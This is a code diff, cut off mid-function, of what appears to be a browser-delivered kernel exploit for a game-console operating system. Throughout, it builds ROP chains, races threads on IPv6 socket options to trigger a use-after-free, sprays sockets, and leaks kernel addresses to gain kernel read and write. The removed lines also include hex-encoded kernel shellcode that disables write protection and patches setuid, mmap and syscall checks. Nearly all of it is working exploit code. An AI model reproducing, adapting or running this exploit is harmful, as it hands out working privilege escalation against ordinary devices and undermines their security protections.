+  fix_me[NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS + NUM_SLAVE_SOCKS + 0x0] = master_socket;
+  fix_me[NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS + NUM_SLAVE_SOCKS + 0x1] = spare_socket;
+
+  for (var i = 0; i < 10; i++) {
+    p.write8(fake_socketops.add32(i * 0x8), window.gadgets["ret"]);
   }
-  chain.run();
-  const master_sock = p.read4(master_sock_ptr);
-  const kevent_sock = p.read4(kevent_sock_ptr);
+  p.write8(fake_socketops.add32(0x50), 1);
 
-  const spray_socks = p.arrayFromAddress(spray_socks_ptr);
-  const leak_socks = p.arrayFromAddress(leak_socks_ptr);
-  const slave_socks = p.arrayFromAddress(slave_socks_ptr);
-  const kqueues = p.arrayFromAddress(kqueues_ptr);
-  const spare_sock = p.read8(spare_sock_ptr);
+  var thr1_start;
+  var thr1_ctrl;
+  const thread1 = chain.spawn_thread("thread1", function (new_thr) {
+    const loop_start = new_thr.get_rsp();
+    const trigger_condition = new_thr.create_equal_branch(triggered, 1);
 
+    const triggered_false = new_thr.get_rsp();
+    new_thr.syscall_safe(118, master_socket, IPPROTO_IPV6, IPV6_TCLASS, master_thr1_tclass, size_of_tclass);
+    const overlap_condition = new_thr.create_equal_branch(master_thr1_tclass, SPRAY_TCLASS);
 
-  //EV_SET(&kv, kevent_sock, EVFILT_READ, EV_ADD, 0, 5, NULL);
-  p.write8(kevent_ptr.add32(0x0), kevent_sock);
-  p.write8(kevent_ptr.add32(0x8), 0x1FFFF);
-  p.write8(kevent_ptr.add32(0x10), 5);
-  p.write8(kevent_ptr.add32(0x18), 0);
-  p.write8(errno_location, 0);
-
-  chain.clear();
-  for (var i = 0; i < NUM_LEAK_SOCKS; i++) {
-    chain.fcall(window.syscalls[105], leak_socks[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
-    chain.fcall(window.syscalls[105], leak_socks[i], IPPROTO_IPV6, IPV6_TCLASS, tmp_class, 4);
-  }
-  chain.run();
-
-  var thr1 = spawn_thread("thr1", function (new_thr) {
-
-    var thr1_start_loop = new_thr.get_rsp();
-
-    //condition 1 start
-    var thr1_condition1_space = new_thr.create_equality_branch(triggered_ptr, 1);
-
-    //condition 1 not equal
-    var thr1_condition1_unequal = new_thr.get_rsp();
-    new_thr.syscall_fix(118, master_sock, IPPROTO_IPV6, IPV6_TCLASS, master_class, master_class_sz);
-    var thr1_condition2_space = new_thr.create_equality_branch(master_class, SPRAY_TCLASS);
-
-    //condition 2 not equal
-    var thr1_condition2_unequal = new_thr.get_rsp();
-    new_thr.syscall_fix(105, master_sock, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, valid_buf, size_of_valid_buf);
-    new_thr.jmp_rsp(thr1_start_loop);
-
-    //condition (1 || 2) equal
-    var thr1_condition_equal = new_thr.get_rsp();
-    new_thr.push_write8(triggered_ptr, 1);
-
+    const overlap_false = new_thr.get_rsp();
+    new_thr.syscall_safe(105, master_socket, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, valid_pktopts, size_of_valid_pktopts);
     new_thr.push(window.gadgets["pop rdi"]);
-    new_thr.push(0);
-    new_thr.push(libKernelBase.add32(pthread_exit_offset)); //pthread_exit
+    var dest_idx = new_thr.pushSymbolic();
+    new_thr.push(window.gadgets["pop rsi"]);
+    var src_idx = new_thr.pushSymbolic();
+    new_thr.push(window.gadgets["mov [rdi], rsi"]);
+    var l1 = new_thr.get_rsp();
+    new_thr.push(window.gadgets["pop rsp"]);
+    var l2 = new_thr.get_rsp();
+    new_thr.push(0x43434343);
 
-    //setup
-    new_thr.set_equality_branches(thr1_condition1_space, thr1_condition_equal, thr1_condition1_unequal);
-    new_thr.set_equality_branches(thr1_condition2_space, thr1_condition_equal, thr1_condition2_unequal);
+    new_thr.finalizeSymbolic(dest_idx, l2);
+    new_thr.finalizeSymbolic(src_idx, l1);
+    thr1_start = loop_start;
+    thr1_ctrl = l2;
+
+    const overlap_true = new_thr.get_rsp();
+    new_thr.push_write8(triggered, 1);
+
+    const triggered_true = new_thr.get_rsp();
+    new_thr.fcall(libKernelBase.add32(OFFSET_lk_pthread_exit), 0);
+
+    new_thr.set_branch_points(trigger_condition, triggered_true, triggered_false);
+    new_thr.set_branch_points(overlap_condition, overlap_true, overlap_false);
   });
 
-  var thr2 = spawn_thread("thr2", function (new_thr) {
-    var thr2_start_loop = new_thr.get_rsp();
+  //boys dont race too fast now, kthx.
+  var me = chain.call(libKernelBase.add32(OFFSET_lk_pthread_self));
+  var prio = p.malloc(0x8);
+  p.write4(prio, 0x100);
+  var r = chain.call(libKernelBase.add32(OFFSET_lk_pthread_setschedparam), me, 1, prio);
 
-    //condition 1 start
-    var thr2_condition1_space = new_thr.create_equality_branch(triggered_ptr, 1);
-
-    var thr2_condition1_unequal = new_thr.get_rsp();
-    new_thr.syscall_fix(118, master_sock, IPPROTO_IPV6, IPV6_TCLASS, master_class2, master_class_sz);
-    var thr2_condition2_space = new_thr.create_equality_branch(master_class2, SPRAY_TCLASS);
-
-    var thr2_condition2_unequal = new_thr.get_rsp();
-    new_thr.syscall_fix(105, master_sock, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
-    new_thr.syscall_fix(240, nanosleep_ptr, 0);
-    new_thr.jmp_rsp(thr2_start_loop);
-
-    var thr2_condition_equal = new_thr.get_rsp();
-    new_thr.push_write8(triggered_ptr, 1);
-
-    new_thr.push(window.gadgets["pop rdi"]);
-    new_thr.push(0);
-    new_thr.push(libKernelBase.add32(pthread_exit_offset)); //pthread_exit
-
-    //setup
-    new_thr.set_equality_branches(thr2_condition1_space, thr2_condition_equal, thr2_condition1_unequal);
-    new_thr.set_equality_branches(thr2_condition2_space, thr2_condition_equal, thr2_condition2_unequal);
-  });
-
-
-  var new_thr3 = new rop();
-  window.nogc.push(new_thr3);
-  new_thr3.clear();
-
-
-  var thr3_loop_start = new_thr3.get_rsp();
-  for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
-    new_thr3.syscall_fix(105, spray_socks[i], IPPROTO_IPV6, IPV6_TCLASS, spray_class, 4);
-  }
-  new_thr3.syscall_fix(118, master_sock, IPPROTO_IPV6, IPV6_TCLASS, master_class3, master_class_sz);
-  var thr3_condition1_space = new_thr3.create_equality_branch(master_class3, SPRAY_TCLASS);
-
-
-  var thr3_condition1_unequal = new_thr3.get_rsp();
-  for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
-    new_thr3.syscall_fix(105, spray_socks[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
-  }
-  new_thr3.syscall_fix(240, nanosleep_ptr, 0);
-  new_thr3.jmp_rsp(thr3_loop_start);
-
-  var thr3_condition1_equal = new_thr3.get_rsp();
-  new_thr3.push_write8(triggered_ptr, 1);
-
-  new_thr3.set_equality_branches(thr3_condition1_space, thr3_condition1_equal, thr3_condition1_unequal);
-
-  new_thr3.fcall(window.syscalls[105], master_sock, IPPROTO_IPV6, IPV6_TCLASS, taint_class, 4);
-  for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
-    new_thr3.fcall(window.syscalls[118], spray_socks[i], IPPROTO_IPV6, IPV6_TCLASS, find_overlap_ptr.add32(0x4 * i), master_class_sz);
-  }
-
-
-  var fake_pktopts = function (pktinfo, tclass) {
-
-    for (var i = 1; i < 0x100; i += 8) {
-      p.write8(rthdr_buf.add32(i), 0);
+  const thread3 = new rop(); {
+    //main loop
+    const loop_start = thread3.get_rsp();
+    //set valid.
+    thread3.syscall_safe(105, master_socket, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, valid_pktopts, size_of_valid_pktopts);
+    //make thr1 give it a go
+    thread3.push_write8(thr1_ctrl, thr1_start);
+    thread3.syscall_safe(118, master_socket, IPPROTO_IPV6, IPV6_TCLASS, master_thr2_tclass, size_of_tclass);
+    thread3.syscall_safe(105, master_socket, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
+    for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
+      thread3.syscall_safe(105, spray_sockets[i], IPPROTO_IPV6, IPV6_TCLASS, spray_tclass, 4);
     }
-    p.write8(rthdr_buf, 0x0F001E00);
-
-    new_thr3.clear();
-    new_thr3.push_write8(rthdr_buf.add32(PKTOPTS_PKTINFO_OFFSET), pktinfo);
-    new_thr3.push_write8(tmp_class, 0x0);
-    new_thr3.fcall(window.syscalls[105], overlapped_socket, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
-
-    for (var i = 0; i < NUM_LEAK_SOCKS; i++) {
-      new_thr3.push_write8(rthdr_buf.add32(PKTOPTS_TCLASS_OFFSET), (tclass | i)); //write modfied tclass
-      new_thr3.syscall_fix(105, leak_socks[i], IPPROTO_IPV6, IPV6_RTHDR, rthdr_buf, 0xF8); //set rthdr buffer
+    thread3.syscall_safe(118, master_socket, IPPROTO_IPV6, IPV6_TCLASS, master_main_tclass, size_of_tclass);
+    const overlap_condition = thread3.create_equal_branch(master_main_tclass, SPRAY_TCLASS);
+    const overlap_false = thread3.get_rsp();
+    for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
+      thread3.syscall_safe(105, spray_sockets[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
     }
-    new_thr3.syscall_fix(118, master_sock, IPPROTO_IPV6, IPV6_TCLASS, tmp_class, master_class_sz);
-
-    new_thr3.run();
-
-    var ltclass = p.read4(tmp_class);
-    if ((ltclass & 0xFFFF0000) == tclass) {
-      return ltclass & 0x0000FFFF;
+    thread3.jmp_rsp(loop_start);
+    const overlap_true = thread3.get_rsp();
+    thread3.push_write8(triggered, 1);
+    thread3.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_TCLASS, taint_tclass, 4);
+    for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
+      thread3.fcall(syscalls[118], spray_sockets[i], IPPROTO_IPV6, IPV6_TCLASS, spray_socks_tclasses_ptr.add32(0x4 * i), size_of_tclass);
     }
-    alert("failed to find rthdr <-> master sock overlap");
-    while(1){}
+    //make sure the thread will exit(?)
+    thread3.push_write8(thr1_ctrl, thr1_start);
+    thread3.set_branch_points(overlap_condition, overlap_true, overlap_false);
   }
+  //trigger uaf
+  thread1();
+  thread3.run();
 
-  var leak_kmalloc = function (sz) {
-    //only does 0x100 & 0x800, everything to avoid that build function hah
-    var t = 0xF8;
-    if (sz == 0x100) {
-      t = 0xF8;
-      for (var i = 1; i < 0x100; i += 8) {
-        p.write8(rthdr_buf.add32(i), 0);
-      }
-      p.write8(rthdr_buf, 0x0F001E00);
-      p.write8(rthdr_buf_len_ptr, 0x100);
-    } else if (sz == 0x800) {
-      t = 0x7F8;
-      for (var i = 1; i < 0x800; i += 8) {
-        p.write8(rthdr_buf.add32(i), 0);
-      }
-      p.write8(rthdr_buf, 0x7F00FE00);
-      p.write8(rthdr_buf_len_ptr, 0x800);
-    }
-    new_thr3.clear();
-    new_thr3.fcall(window.syscalls[105], master_sock, IPPROTO_IPV6, IPV6_RTHDR, rthdr_buf, t);
-    new_thr3.fcall(window.syscalls[118], overlapped_socket, IPPROTO_IPV6, IPV6_RTHDR, rthdr_buf, rthdr_buf_len_ptr);
-    new_thr3.run();
-    return p.read8(rthdr_buf.add32(PKTOPTS_RTHDR_OFFSET));
-  }
-
-  var leak_address = function () {
-
-    kevent_leak_addr = leak_kmalloc(0x800);
-    //alert("leaked kevent_leak_addr address = 0x" + kevent_leak_addr.toString(16));
-    new_thr3.clear();
-    new_thr3.fcall(window.syscalls[105], master_sock, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
-    for (var i = 0; i < NUM_KQUEUES; i++) {
-      new_thr3.fcall(window.syscalls[363], kqueues[i], kevent_ptr, 1, 0, 0, 0);
-    }
-    new_thr3.run();
-
-    pktopts_leak_addr = leak_kmalloc(0x100);
-    //alert("leaked pktopts address = 0x" + pktopts_leak_addr.toString(16));
-    p.write8(tmp_class, 0);
-    new_thr3.clear();
-    new_thr3.fcall(window.syscalls[105], master_sock, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
-    for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
-      new_thr3.fcall(window.syscalls[105], slave_socks[i], IPPROTO_IPV6, IPV6_TCLASS, tmp_class, 4);
-    }
-    new_thr3.run();
-  }
-  var write_to_victim = function (addr) {
-    p.write8(slave_buf_ptr.add32(0x0), addr);
-    p.write8(slave_buf_ptr.add32(0x8), 0);
-    p.write4(slave_buf_ptr.add32(0x10), 0);
-    var r = p.syscall(105, master_sock, IPPROTO_IPV6, IPV6_PKTINFO, slave_buf_ptr, 0x14);
-    //alert("write_to_victim r = 0x" + r);
-  }
-  var find_victim = function () {
-    write_to_victim(pktopts_leak_addr.add32(PKTOPTS_PKTINFO_OFFSET));
-    new_thr3.clear();
-    for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
-      new_thr3.fcall(window.syscalls[118], slave_socks[i], IPPROTO_IPV6, IPV6_PKTINFO, find_slave_buf_ptr.add32(i * 8), slave_buf_len_ptr);
-    }
-    new_thr3.run();
-    for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
-      if (p.read4(find_slave_buf_ptr.add32(0x8 * i)) == pktopts_leak_addr.add32(PKTOPTS_PKTINFO_OFFSET).low) {
-        victim_sock_idx = i;
-        victim_sock = slave_socks[i];
-        //alert("found slave :) -> 0x" + p.read8(find_slave_buf_ptr.add32(0x8 * i)));
+  function find_socket_overlap() {
+    for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
+      if (spray_socks_tclasses[i] == TAINT_CLASS) {
+        overlapped_socket = spray_sockets[i];
+        overlapped_socket_idx = i;
         return;
       }
     }
-    alert("failed to find slave");
-    while(1){}
+    alert("[ERROR] -> failed to find socket overlap. (should be unreachable)");
+    while (1) {};
   }
 
-  var kernel_read8 = function (addr) {
-    write_to_victim(addr);
-    var r = p.syscall(118, victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, kernel_read_buf_ptr, kernel_read_buf_len_ptr);
-    return p.read8(kernel_read_buf_ptr);
-  }
-  var kernel_write8 = function (addr, value) {
-    write_to_victim(addr);
-    p.syscall(118, victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, kernel_read_buf_ptr, kernel_read_buf_len_ptr);
-    p.write8(kernel_read_buf_ptr, value);
-    p.syscall(105, victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, kernel_read_buf_ptr, 0x14);
-  }
-  var jit_me_proc = function (targetpp) {
-    //gib process jitty rights @thx kiwi for tip
-    kernel_write8(targetpp.add32(0x60), new int64(0xFFFFFFFF, 0xFFFFFFFF));
-    kernel_write8(targetpp.add32(0x68), new int64(0xFFFFFFFF, 0xFFFFFFFF));
-    //alert("jit enabled");
-  }
-  thr1();
-  thr2();
-  new_thr3.run();
+  function fake_pktopts(pktinfo) {
+    {
 
-  for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
-    if (p.read4(find_overlap_ptr.add32(0x4 * i)) == TAINT_CLASS) {
-      overlapped_socket_idx = i;
-      overlapped_socket = spray_socks[i];
-      break;
+      chain.fcall(libSceLibcInternalBase.add32(OFFSET_libcint_memset), rthdr_buffer, 0x0, 0x100);
+      chain.push_write8(rthdr_buffer.add32(0x0), 0x0F001E00);
+      chain.push_write8(rthdr_buffer.add32(PKTOPTS_PKTINFO_OFFSET), pktinfo);
+      chain.push_write8(loop_counter, 0);
+      chain.push_write8(tmp_tclass, 0x1);
+      for (var i = 0; i < NUM_LEAK_SOCKS; i++) {
+        chain.fcall(syscalls[105], leak_sockets[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
+        chain.fcall(syscalls[105], leak_sockets[i], IPPROTO_IPV6, IPV6_TCLASS, tmp_tclass, 4);
+      }
+      chain.fcall(window.syscalls[105], overlapped_socket, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
+
+      const loop_start = chain.get_rsp();
+      const loop_condition = chain.create_equal_branch(loop_counter, 0x100);
+
+      const loop_condition_false = chain.get_rsp();
+      for (var i = 0; i < NUM_LEAK_SOCKS; i++) {
+        chain.push_write8(rthdr_buffer.add32(PKTOPTS_TCLASS_OFFSET), (TCLASS_MASTER | i));
+        chain.syscall_safe(105, leak_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, rthdr_buffer, 0xF8);
+      }
+      chain.syscall_safe(118, master_socket, IPPROTO_IPV6, IPV6_TCLASS, tmp_tclass, size_of_tclass);
+      const overlap_condition = chain.create_greater_or_equal_branch(tmp_tclass, TCLASS_MASTER);
+
+      const overlap_false = chain.get_rsp();
+      chain.push(window.gadgets["pop rax"]);
+      chain.push(loop_counter);
+      chain.push(window.gadgets["inc dword [rax]"]);
+      chain.jmp_rsp(loop_start);
+
+      const loop_condition_true = chain.get_rsp();
+      const overlap_true = chain.get_rsp();
+
+      chain.set_branch_points(loop_condition, loop_condition_true, loop_condition_false);
+      chain.set_branch_points(overlap_condition, overlap_true, overlap_false);
     }
-  }
-  if (overlapped_socket == -1) {
-    alert("failed to find overlapped socket, how even?");
-    while (true) {}
-  }
+    chain.run();
 
+    const tclass = p.read4(tmp_tclass);
+    if ((tclass & 0xFFFF0000) == TCLASS_MASTER) {
+      overlapped_socket_idx = (tclass & 0x0000FFFF);
+      overlapped_socket = leak_sockets[overlapped_socket_idx];
+      return;
+    }
+    alert("[ERROR] failed to find RTHDR <-> master socket overlap");
+    while (1) {};
 
-  //alert("fake 1");
-  overlapped_socket_idx = fake_pktopts(0, TCLASS_MASTER);
-  if (overlapped_socket_idx == -1) {
-    alert("failed to fake pktopts 1");
-    while (true) {}
-  }
-  overlapped_socket = leak_socks[overlapped_socket_idx];
-  leak_socks[overlapped_socket_idx] = spare_sock;
-
-  leak_address();
-
-  chain.clear();
-  for (var i = 0; i < NUM_LEAK_SOCKS; i++) {
-    chain.fcall(window.syscalls[105], leak_socks[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
-    chain.fcall(window.syscalls[105], leak_socks[i], IPPROTO_IPV6, IPV6_TCLASS, tmp_class, 4);
-  }
-  chain.run();
-  //alert("fake 2");
-  overlapped_socket_idx = fake_pktopts(pktopts_leak_addr.add32(PKTOPTS_PKTINFO_OFFSET), TCLASS_MASTER2);
-  if (overlapped_socket_idx == -1) {
-    alert("failed to fake pktopts 2");
-    while (true) {}
-  }
-  overlapped_socket = leak_socks[overlapped_socket_idx];
-  //alert("overlapped socket 3 = " + overlapped_socket + "indx (" + overlapped_socket_idx);
-  //find slave
-  find_victim();
-  var knote_addr = kernel_read8(kevent_leak_addr.add32(kevent_sock * 0x8));
-  //alert("knote_addr = 0x" + knote_addr);
-
-
-  var knote_kn = kernel_read8(knote_addr.add32(KNOTE_KN_OFFSET));
-  //alert("knote_kn = 0x" + knote_kn);
-  var socketops_ptr = kernel_read8(knote_kn.add32(0x8));
-  kernel_base = socketops_ptr.sub32(KERNEL_SOCKETOPS_OFFSET);
-  //alert("kernel_base = 0x" + kernel_base);
-
-  //r8 of ioctl handler == thread*
-  //use gadget that returns thread*
-  //syscall handler will return lower 4 bytes
-  //read errno to get 4 bytes
-  //use heap hi dword to create the thread*
-  p.write8(fake_sockopts.add32(0x18), window.gadgets["mov rax, r8"]);
-  kernel_write8(knote_kn.add32(0x8), fake_sockopts);
-  //alert("executing gadget");
-  var ssysret = p.syscall(54, kevent_sock, 0x20001111, 0);
-  var lowwer = p.read8(errno_location);
-  //alert("ssysret= 0x" + ssysret + "\r\nerrno = 0x" + lowwer);
-  var this_thread_ptr = new int64(lowwer.low, pktopts_leak_addr.hi);
-  //alert("target thread = 0x" + this_thread_ptr);
-  var target_ucred = kernel_read8(this_thread_ptr.add32(0x130));
-  jit_me_proc(target_ucred);
-
-  //create jit mem
-  var exec_handle = p.syscall(533, 0, 0x100000, 7);
-  var write_handle = p.syscall(534, exec_handle, 3);
-  var write_address = p.syscall(477, new int64(0x91000000, 0x9), 0x100000, 3, 17, write_handle, 0);
-  var exec_address = p.syscall(477, new int64(0x90000000, 0x9), 0x100000, 0x5, 1, exec_handle, 0)
-  p.syscall(324, 1);
-  if (exec_address.low != 0x90000000) {
-    alert("failed to allocate rwx memory");
   }
 
-  var this_proc_ptr = kernel_read8(this_thread_ptr.add32(0x8));
-  var this_p_fd_ptr = kernel_read8(this_proc_ptr.add32(0x48));
-  var this_fd_ofiles_ptr = kernel_read8(this_p_fd_ptr.add32(0x0));
-
-  var this_master_sock_file = kernel_read8(this_fd_ofiles_ptr.add32(0x8 * master_sock));
-  var this_overlapped_socket_file = kernel_read8(this_fd_ofiles_ptr.add32(0x8 * overlapped_socket));
-
-  var this_master_sock_file_data = kernel_read8(this_master_sock_file);
-  var this_overlapped_socket_file_data = kernel_read8(this_overlapped_socket_file);
-
-  var this_master_sock_pcb = kernel_read8(this_master_sock_file_data.add32(0x18));
-  var this_overlapped_socket_pcb = kernel_read8(this_overlapped_socket_file_data.add32(0x18));
-
-  var this_master_sock_pktopts_address = kernel_read8(this_master_sock_pcb.add32(0x118));
-  var this_overlapped_socket_pktopts_address = kernel_read8(this_overlapped_socket_pcb.add32(0x118));
-
-  /*
-      mov rdi, 0xAAAAAAAAAAAAAAAA //master pktinfo
-      mov qword ptr [rdi], 0
-      mov rdi, 0xAAAAAAAAAAAAAAAA //overlap rthdr
-      mov qword ptr [rdi], 0
-      mov rdi, 0xAAAAAAAAAAAAAAAA //slave pktinfo
-      mov qword ptr [rdi], 0
-      mov rdi, 0xAAAAAAAAAAAAAAAA //sockopts ptr field
-      mov rsi, 0xAAAAAAAAAAAAAAAA //original sockopts
-      mov qword ptr [rdi], rsi
-
-      mov rdi, 0xAAAAAAAAAAAAAAAA //kernel base
-      //disable wp
-      mov rax, cr0
-      and rax, 0xFFFFFFFFFFFEFFFF
-      mov cr0, rax
-
-      
-      //log crash? 
-      // mov byte ptr [rdi + 0x77f860], 0xC3
-
-      //rwx mprotect
-      mov dword ptr [rdi + 0x2ee98], 0x90909090
-      mov word ptr [rdi + 0x2ee9c], 0x9090
-
-      //setuid
-      mov dword ptr [rdi + 0x107c2], 0x000000B8
-
-      //syscalls everywhere
-      mov dword ptr [rdi + 0x490], 0
-      mov word ptr [rdi + 0x4b9], 0x9090
-      mov word ptr [rdi + 0x4bd], 0x9090
-      mov word ptr [rdi + 0x4c6], 0xE990
-
-      //rwx mmap
-      mov byte ptr [rdi + 0x3c25d9], 0x37
-      mov byte ptr [rdi + 0x3c25dc], 0x37
-
-      //dlsym
-      mov word ptr [rdi + 0x6390A], 0xE990
-      mov dword ptr [rdi + 0x400130], 0xC3C03148
-      
-
-      //syscall 11
-      mov qword ptr [rdi + 0x1115ed0], 0x2
-      mov rsi, 0xaf8c
-      add rsi, rdi
-      mov qword ptr [rdi + 0x1115ed8], rsi
-      mov rsi, 0x0000000100000000
-      mov qword ptr [rdi + 0x1115ef8], rsi
-
-
-      //enable wp
-      or rax, 0x10000
-      mov cr0, rax
-      mov rax, 0x8080808080808080
-      ret
-  */
-
-  var exec_writer = p.arrayFromAddress(write_address);
-
-  for (var i = 0; i < 0x100; i++) {
-    exec_writer[i] = 0x90909090;
-  }
-  exec_writer[0x100] = 0x37C0C748;
-  exec_writer[0x101] = 0xC3000013;
-
-  var jitt = p.fcall(exec_address);
-  if (jitt.low != 0x1337) {
-    alert("failed jit test = 0x" + jitt);
+  function leak_rthdr_address(size) {
+    const ip6r_len = ((size >> 3) - 1 & ~1);
+    const ip6r_segleft = (ip6r_len >> 1);
+    const header = (ip6r_len << 8) + (ip6r_segleft << 24); {
+      chain.fcall(libSceLibcInternalBase.add32(OFFSET_libcint_memset), rthdr_buffer, 0x0, size);
+      chain.push_write8(rthdr_buffer, header);
+      chain.push_write8(ptr_size_of_rthdr_buffer, size);
+      chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_RTHDR, rthdr_buffer, ((ip6r_len + 1) << 3));
+      chain.fcall(syscalls[118], overlapped_socket, IPPROTO_IPV6, IPV6_RTHDR, rthdr_buffer, ptr_size_of_rthdr_buffer);
+    }
+    chain.run();
+    const kaddress = p.read8(rthdr_buffer.add32(PKTOPTS_RTHDR_OFFSET));
+    return kaddress;
   }
 
-  exec_writer[0] = 0xAAAABF48;
-  exec_writer[1] = 0xAAAAAAAA;
-  exec_writer[2] = 0xC748AAAA;
-  exec_writer[3] = 0x00000007;
-  exec_writer[4] = 0xAABF4800;
-  exec_writer[5] = 0xAAAAAAAA;
-  exec_writer[6] = 0x48AAAAAA;
-  exec_writer[7] = 0x000007C7;
-  exec_writer[8] = 0xBF480000;
-  exec_writer[9] = 0xAAAAAAAA;
-  exec_writer[10] = 0xAAAAAAAA;
-  exec_writer[11] = 0x0007C748;
-  exec_writer[12] = 0x48000000;
-  exec_writer[13] = 0xAAAAAABF;
-  exec_writer[14] = 0xAAAAAAAA;
-  exec_writer[15] = 0xAABE48AA;
-  exec_writer[16] = 0xAAAAAAAA;
-  exec_writer[17] = 0x48AAAAAA;
-  exec_writer[18] = 0xBF483789;
-  exec_writer[19] = 0xAAAAAAAA;
-  exec_writer[20] = 0xAAAAAAAA;
-  exec_writer[21] = 0x48C0200F;
-  exec_writer[22] = 0xFEFFFF25;
-  exec_writer[23] = 0xC0220FFF;
-  exec_writer[24] = 0xEE9887C7;
-  exec_writer[25] = 0x90900002;
-  exec_writer[26] = 0xC7669090;
-  exec_writer[27] = 0x02EE9C87;
-  exec_writer[28] = 0xC7909000;
-  exec_writer[29] = 0x0107C287;
-  exec_writer[30] = 0x0000B800;
-  exec_writer[31] = 0x9087C700;
-  exec_writer[32] = 0x00000004;
-  exec_writer[33] = 0x66000000;
-  exec_writer[34] = 0x04B987C7;
-  exec_writer[35] = 0x90900000;
-  exec_writer[36] = 0xBD87C766;
-  exec_writer[37] = 0x90000004;
-  exec_writer[38] = 0x87C76690;
-  exec_writer[39] = 0x000004C6;
-  exec_writer[40] = 0x87C6E990;
-  exec_writer[41] = 0x003C25D9;
-  exec_writer[42] = 0xDC87C637;
-  exec_writer[43] = 0x37003C25;
-  exec_writer[44] = 0x0A87C766;
-  exec_writer[45] = 0x90000639;
-  exec_writer[46] = 0x3087C7E9;
-  exec_writer[47] = 0x48004001;
-  exec_writer[48] = 0x48C3C031;
-  exec_writer[49] = 0x5ED087C7;
-  exec_writer[50] = 0x00020111;
-  exec_writer[51] = 0xC7480000;
-  exec_writer[52] = 0x00AF8CC6;
-  exec_writer[53] = 0xFE014800;
-  exec_writer[54] = 0xD8B78948;
-  exec_writer[55] = 0x4801115E;
-  exec_writer[56] = 0x000000BE;
-  exec_writer[57] = 0x00000100;
-  exec_writer[58] = 0xB7894800;
-  exec_writer[59] = 0x01115EF8;
-  exec_writer[60] = 0x00000D48;
-  exec_writer[61] = 0x220F0001;
-  exec_writer[62] = 0x80B848C0;
-  exec_writer[63] = 0x80808080;
-  exec_writer[64] = 0xC3808080;
+  function leak_pktopts() {
+    leaked_pktopts_address = leak_rthdr_address(0x100); {
+      chain.push_write8(tmp_tclass, 0x10);
+      chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
+      for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
+        chain.fcall(syscalls[105], slave_sockets[i], IPPROTO_IPV6, IPV6_TCLASS, tmp_tclass, 4);
+      }
+    }
+    chain.run();
+  }
 
+  function find_slave() {
+    {
+      chain.push_write8(pktinfo_buffer, leaked_pktopts_address.add32(PKTOPTS_PKTINFO_OFFSET));
+      chain.push_write8(pktinfo_buffer.add32(0x8), 0);
+      chain.push_write8(pktinfo_buffer.add32(0x10), 0);
+      chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, 0x14);
+      for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
+        chain.fcall(syscalls[118], slave_sockets[i], IPPROTO_IPV6, IPV6_PKTINFO, find_slave_buffer.add32(0x8 * i), pktinfo_buffer_len);
+      }
+    }
+    chain.run();
 
-  p.write8(write_address.add32(0x2), this_master_sock_pktopts_address.add32(PKTOPTS_PKTINFO_OFFSET));
-  p.write8(write_address.add32(0x13), this_overlapped_socket_pktopts_address.add32(PKTOPTS_RTHDR_OFFSET));
-  p.write8(write_address.add32(0x24), pktopts_leak_addr.add32(PKTOPTS_PKTINFO_OFFSET));
-  p.write8(write_address.add32(0x35), knote_kn.add32(0x8));
-  p.write8(write_address.add32(0x3F), socketops_ptr);
-  p.write8(write_address.add32(0x4C), kernel_base);
+    for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
+      if (p.read4(find_slave_buffer.add32(0x8 * i)) == (leaked_pktopts_address.add32(PKTOPTS_PKTINFO_OFFSET)).low) {
+        slave_socket = slave_sockets[i];
+        return;
+      }
+    }
+    alert("[ERROR] failed to find slave");
+    while (1) {};
+  }
 
-  p.write8(fake_sockopts.add32(0x18), exec_address);
-  //alert("kernel payload");
-  p.syscall(54, kevent_sock, 0x20001111, 0);
-  //alert("survived kernel hell, all is ok? 0x" + p.read8(errno_location)); //0x80808080
+  function kernel_read8(address) {
+    {
+      chain.push_write8(pktinfo_buffer, address);
+      chain.push_write8(pktinfo_buffer.add32(0x8), 0);
+      chain.push_write8(pktinfo_buffer.add32(0x10), 0);
+      chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, 0x14);
+      chain.fcall(syscalls[118], slave_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, pktinfo_buffer_len)
+    }
+    chain.run();
+    return p.read8(pktinfo_buffer);
+  }
 
+  function kernel_write8(address, value) {
+    {
